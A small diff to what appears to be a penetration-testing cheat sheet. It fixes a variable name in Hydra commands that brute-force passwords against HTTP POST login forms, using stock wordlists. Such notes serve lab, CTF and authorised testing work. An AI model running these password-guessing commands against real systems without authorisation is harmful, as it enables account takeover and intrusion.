@@ -9,7 +9,7 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/
 # HTTP post form
 PORT=80
 SERVER=toaster.com
-hydra -l user -P /usr/share/dirb/wordlists/small.txt $HOST http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Login failed" -V
+hydra -l user -P /usr/share/dirb/wordlists/small.txt $SERVER http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Login failed" -V
 hydra -l user -P $WORDLIST -s $PORT $SERVER http-post-form "/:password=^PASS^&submit=Submit:Invalid" -V
 
 # HTTP basic auth
